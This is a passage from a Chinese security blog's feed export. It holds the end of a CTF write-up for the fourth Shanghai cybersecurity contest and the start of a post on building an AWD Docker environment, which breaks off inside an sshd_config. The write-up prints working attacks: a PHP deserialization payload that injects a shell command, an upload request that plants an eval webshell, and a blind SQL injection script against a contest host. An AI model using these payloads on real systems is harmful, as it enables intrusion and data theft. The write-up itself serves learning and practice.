punctuation">.</span><span class="token string">"\"/>"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> "you need post url<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.ichunqiu.com";</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"only 127.0.0.1 can get the flag!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>实际上考的是<code>libcurl</code>and<code>parse_url()</code>解析问题。</p><p>这里可以参考<a href="http://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize(" target="_blank" rel="noopener">一叶飘零师傅</a>/)写的一篇博文。</p></blockquote><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><blockquote><p>扫目录得swp交换文件==&gt;vim恢复文件==&gt;得到index.php源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">come</span><span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[&lt;>*;|?\n ]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>               <span class="token keyword">function</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo $host"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"echo"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token variable">$first</span><span class="token operator">=</span><span class="token string">'hi'</span><span class="token punctuation">;</span><span class="token variable">$var</span><span class="token operator">=</span><span class="token string">'var'</span><span class="token punctuation">;</span><span class="token variable">$bbb</span><span class="token operator">=</span><span class="token string">'bbb'</span><span class="token punctuation">;</span><span class="token variable">$ccc</span><span class="token operator">=</span><span class="token string">'ccc'</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>            $<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token operator">===</span><span class="token string">"doller"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token operator">===</span><span class="token string">"give"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$bbb</span><span class="token operator">===</span><span class="token string">"me"</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token operator">===</span><span class="token string">"flag"</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br>welcome!&lt;br>"</span><span class="token punctuation">;</span>                <span class="token variable">$come</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'come'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$come</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>think about it&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"NO"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Can you hack me?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>这是一个关键点为反序列化的问题，我们可以先构造get参数绕过前面的检测，来到post参数处。</p><p>构造get参数:<code>?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</code>,通过parse_str覆盖原有变量即可。</p><p>然后这题并不是绕过wakeup，因为在新版php中已经修复这个问题，我们要在echo($host)处注入命令执行，所以还是需要规规矩矩地进行绕过过滤，将构造的come Post过去：</p><p><code>come==O%3A4%3A%22come%22%3A2%3A%7Bs%3A12%3A%22%00come%00method%22%3Bs%3A4%3A%22echo%22%3Bs%3A10%3A%22%00come%00args%22%3B%3A1%3A%7Bi%3A0%3Bs%3A23%3A%22aaa%26%26cat%24IFS%22%2Fflflagag%22%22%3B%7D%7D</code></p><p>需要注意的是不用空格执行命令（ <a href="https://www.cnblogs.com/sevck/p/6072721.html" target="_blank" rel="noopener">参考链接 </a>），以及反序列化中私有变量的%00问题，如果不以url编码形式，%00并不会起作用。</p></blockquote><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><blockquote><p>虽然没做出来😭，但还是要学习一下的。</p><p>又是php的代码审计题。</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//error_reporting(0);</span>    <span class="token comment" spellcheck="true">//$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);</span>    <span class="token variable">$dir</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"icq"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/var/sandbox/'</span> <span class="token punctuation">.</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token operator">==</span><span class="token variable">$filename</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"emmmm..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$new_name</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'hehe'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">'@&lt;?php'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><blockquote><p>考察两个知识点，一个是数组绕过，以及unlink  <del>php/.</del> 绕过。</p><p>构造数据包如下（本地复现）：</p><pre class=" language-shell"><code class="language-shell">POST /shawsweb3.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: http://127.0.0.1/upload.htmlContent-Type: multipart/form-data; boundary=----------------------------280543779984883401718121Content-Length: 586Connection: closeUpgrade-Insecure-Requests: 1----------------------------280543779984883401718121Content-Disposition: form-data; name="file[0]"php----------------------------280543779984883401718121Content-Disposition: form-data; name="file[a]"php/.----------------------------280543779984883401718121Content-Disposition: form-data; name="hehe"100.php----------------------------280543779984883401718121Content-Disposition: form-data; name="file"; filename="index.php"Content-Type: application/x-httpd-php@<?php    @eval($_GET['cmd']);?>----------------------------280543779984883401718121--</code></pre><p>再通过遍历文件名拿到权限，getflag。</p></blockquote><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><blockquote><p>时间盲注 + 文件名拼接  + 上传截断绕过，%02黑脸截断😄。</p><p>构造出payload后可以直接拿给sqlmap跑？神器（有时间再深入研究一下）。也可以自己写脚本跑，例如下面就是我认为一个写的比较简单易用的脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token comment" spellcheck="true">#重用性高的代码是好代码</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>v <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">def</span> <span class="token function">judge</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> text <span class="token operator">!=</span> <span class="token string">'$content=str_replace($value,"",$content)'</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://dbeffc8ba3a84abebc7ff930c5d6fda460a4bee570ff4211.game.ichunqiu.com/select_guest.php"</span>    <span class="token keyword">return</span> get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">blind_inject</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        left <span class="token operator">=</span> <span class="token number">0</span>        right <span class="token operator">=</span> <span class="token number">128</span>        <span class="token keyword">while</span> left <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>            c <span class="token operator">=</span> chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            payload <span class="token operator">=</span> s<span class="token punctuation">.</span>format<span class="token punctuation">(</span>len<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token operator">+</span>len<span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(payload)</span>            <span class="token keyword">if</span> judge<span class="token punctuation">(</span>test<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>        <span class="token keyword">if</span> left <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span>        r <span class="token operator">+=</span> chr<span class="token punctuation">(</span>left<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>v<span class="token operator">+</span>r<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#blind_inject("1%27%20and%20substr(database(),{},1)%20>%20%27{}%27%23")</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true">#blind_inject("1' and substr((SELECT GROUP_CONCAT(table_name) FROM information_schema . tables WHERE table_schema=database()),{},1) > '{}'#")</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true">#blind_inject("1' and substr((SELECT GROUP_CONCAT(column_name) FROM information_schema . columns WHERE table_name = 'user' and table_schema=database()), {},1) > '{}' #")</span>    <span class="token comment" spellcheck="true">#</span>    blind_inject<span class="token punctuation">(</span><span class="token string">"1' and substr((SELECT password FROM web.user where id = 1), {},1) > '{}' #"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>跑flag即可。</p><p>emmm以上是盲注的方法，那么下面还有通过fuzz得到过滤关键字，然后绕过直接注的，因为这是有回显的一个注入嘛。</p><p><code>id=sd&#39; unifromon selselectect (seselectlect group_concat(username,&#39;:&#39;,password)frfromom web.user),2#</code></p><p>总之方法总是多种多样的。</p></blockquote><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><blockquote><p>至于二进制，还在学习之中，密码学的RSA,和AES也需要抽个时间来深入研究一下。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;第四届上海网安暨全国邀请赛-赛后小结&quot;&gt;&lt;a href=&quot;#第四届上海网安暨全国邀请赛-赛后小结&quot; class=&quot;headerlink&quot; title=&quot;第四届上海网安暨全国邀请赛_赛后小结&quot;&gt;&lt;/a&gt;第四届上海网安暨全国邀请赛_赛后小结&lt;
      
    
    </summary>
    
      <category term="网络安全" scheme="http://www.yof3ng.xyz/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="writeup" scheme="http://www.yof3ng.xyz/tags/writeup/"/>
    
      <category term="网络安全" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>打造一个集web和pwn于一体的AWD_docker</title>
    <link href="http://www.yof3ng.xyz/2018/11/03/AWD-docker/"/>
    <id>http://www.yof3ng.xyz/2018/11/03/AWD-docker/</id>
    <published>2018-11-03T15:16:26.000Z</published>
    <updated>2018-11-12T05:14:35.966Z</updated>
    
    <content type="html"><![CDATA[<h1 id="打造一个集web和pwn于一体的AWD-docker"><a href="#打造一个集web和pwn于一体的AWD-docker" class="headerlink" title="打造一个集web和pwn于一体的AWD docker"></a>打造一个集web和pwn于一体的AWD docker</h1><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><blockquote><p>之前已经讲过docker怎么安装，网上也有很多教程，<code>sudo apt-get install docker.io</code>，这里就不赘述了。</p></blockquote><h2 id="拉取具有web环境的image"><a href="#拉取具有web环境的image" class="headerlink" title="拉取具有web环境的image"></a>拉取具有web环境的image</h2><blockquote><p>通过<code>sudo docker search lamp</code>，我们可以查找到有lamp集成环境的他人上传的image：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103224056.png" alt=""></p><p>于是我选择了 tutum/lamp这个image。</p><p>使用命令：<code>sudo docker pull tutum/lamp</code>，将image拉取到本地后，使用命令<code>sudo docker images</code>查看：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103224557.png" alt=""></p></blockquote><h2 id="将CTF-xinetd框架的dockerfile进行修改"><a href="#将CTF-xinetd框架的dockerfile进行修改" class="headerlink" title="将CTF_xinetd框架的dockerfile进行修改"></a>将CTF_xinetd框架的dockerfile进行修改</h2><blockquote><p>修改如下:</p><ul><li><p>将原来的<code>FORM ubuntu:16.04</code>改为<code>FROM tutum/lamp</code>即之前拉取下来的具有web环境的image。</p></li><li><p>添加<code>RUN apt-get -y install openssh-server</code>为ssh连接做准备。</p></li><li>添加awd参赛者用户<code>RUN useradd -u 544  -g users -s /bin/bash -m awduser</code></li><li>添加html目录下的web题源码:<code>COPY ./html/ /var/www/html/web/</code></li><li>配置ssh远程连接：<code>COPY ./sshd_config.txt /etc/ssh/sshd_config</code></li></ul></blockquote><pre class=" language-dockerfile"><code class="language-dockerfile">FROM tutum/lampRUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g" /etc/apt/sources.list && \    apt-get update && \    apt-get install -y lib32z1 xinetdRUN apt-get -y install openssh-serverRUN useradd -m ctfRUN useradd -u 544  -g users -s /bin/bash -m awduserWORKDIR /home/RUN cp -R /lib* /home/ctf && \    cp -R /usr/lib* /home/ctfRUN mkdir /home/ctf/dev && \    mknod /home/ctf/dev/null c 1 3 && \    mknod /home/ctf/dev/zero c 1 5 && \    mknod /home/ctf/dev/random c 1 8 && \    mknod /home/ctf/dev/urandom c 1 9 && \    chmod 666 /home/ctf/dev/*RUN mkdir /home/ctf/bin && \    cp /bin/sh /home/ctf/bin && \    cp /bin/ls /home/ctf/bin && \    cp /bin/cat /home/ctf/bin && \    cp /bin/bash /home/ctf/bin && \    cp /bin/nc /home/ctf/bin && \    cp /usr/bin/git /home/ctf/binCOPY ./ctf.xinetd /etc/xinetd.d/ctfCOPY ./start.sh /start.shRUN echo "Blocked by ctf_xinetd" > /etc/banner_failRUN chmod +x /start.shCOPY ./html/ /var/www/html/web/COPY ./bin/ /home/ctf/COPY ./sshd_config.txt /etc/ssh/sshd_configRUN chown -R root:ctf /home/ctf && \    chown -R awduser:users /var/www/html/* && \    chmod -R 777 /var/www/html/* && \    chmod -R 750 /home/ctf && \    chmod 740 /home/ctf/flagRUN service ssh startCMD ["/start.sh"]CMD ["/run.sh"]EXPOSE 9999</code></pre><p>附上sshd_config配置：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#    $OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $</span><span class="token comment" spellcheck="true"># This is the sshd server system-wide configuration file.  See</span><span class="token comment" spellcheck="true"># sshd_config(5) for more information.</span><span class="token comment" spellcheck="true"># This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin</span><span class="token comment" spellcheck="true"># The strategy used for options in the default sshd_config shipped with</span><span class="token comment" spellcheck="true"># OpenSSH is to specify options with their default value where</span><span class="token comment" spellcheck="true"># possible, but leave them commented.  Uncommented options override the</span><span class="token comment" spellcheck="true"># default value.</span><span class="token comment" spellcheck="true">#Port 22</span><span class="token comment" spellcheck="true">#AddressFamily any</span><span class="token comment" spellcheck="true">#ListenAddress 0.0.0.0</span><span class="token comment" spellcheck="true">#ListenAddress ::</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_rsa_key</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_ecdsa_key</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_ed25519_key</span><span class="token comment" spellcheck="true"># Ciphers and keying</span><span class="token comment" spellcheck="true">#RekeyLimit default none</span><span class="token comment" spellcheck="true"># Logging</span><span class="token comment" spellcheck="true">#SyslogFacility AUTH</span><span class="token comment" spellcheck="true">#LogLevel INFO</span><span class="token comment" spellcheck="true"># Authentication:</span><span class="token comment" spellcheck="true">#LoginGraceTime 2m</span><span class="token comment" spellcheck="true">#PermitRootLogin prohibit-password</span><span class="token comment" spellcheck="true">#StrictModes yes</span><span class="token comment" spellcheck="true">#MaxAuthTries 6</span><span class="token comment" spellcheck="true">#MaxSessions 10</span><span class="token comment" spellcheck="true">#PubkeyAuthentication yes</span><span class="token comment" spellcheck="true"># Expect .ssh/authorized_keys2 to be disregarded by default in future.</span><span class="token comment" spellcheck="true">#AuthorizedKeysFile    .ssh/authorized_keys .ssh/authorized_keys2</span><span class="token comment" spellcheck="true">#AuthorizedPrincipalsFile none</span><span class="token comment" spellcheck="true">#AuthorizedKeysCommand none</span><span class="token comment" spellcheck="true">#AuthorizedKeysCommandUser nobody</span><span class="token comment" spellcheck="true"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><span class="token comment" spellcheck="true">#HostbasedAuthentication no</span><span class="token comment" spellcheck="true"># Change to yes if you don't trust ~/.ssh/known_hosts for</span><span class="token comment" spellcheck="true"># HostbasedAuthentication</span><span class="token comment" spellcheck="true">#IgnoreUserKnownHosts no</span><span class="token comment" spellcheck="true"># Don't read the user's ~/.rhosts and ~/.shosts files</span><span class="token comment" spellcheck="true">#IgnoreRhosts yes</span><span class="token comment" spellcheck="true"># To disable tunneled clear text passwords, change to no here!</span><span class="token comment" spellcheck="true">#PasswordAuthentication yes</span><span class="token comment" spellcheck="true">#PermitEmptyPasswords no</span><span class="token comment" spellcheck="true"># Change to yes to enable challenge-response passwords (beware issues with</span><span class="token comment" spellcheck="true"># some PAM modules and threads)</span>ChallengeResponseAuthentication no<span class="token comment" spellcheck="true"># Kerberos options</span><span class="token comment" spellcheck="true">#KerberosAuthentication no</span><span class="token comment" spellcheck="true">#KerberosOrLocalPasswd yes</span><span class="token comment" spellcheck="true">#KerberosTicketCleanup yes</span><span class="token comment" spellcheck="true">#KerberosGetAFSToken no</span><span class="token comment" spellcheck="true"># GSSAPI options</span><span class="token comment" spellcheck="true">#GSSAPIAuthentication 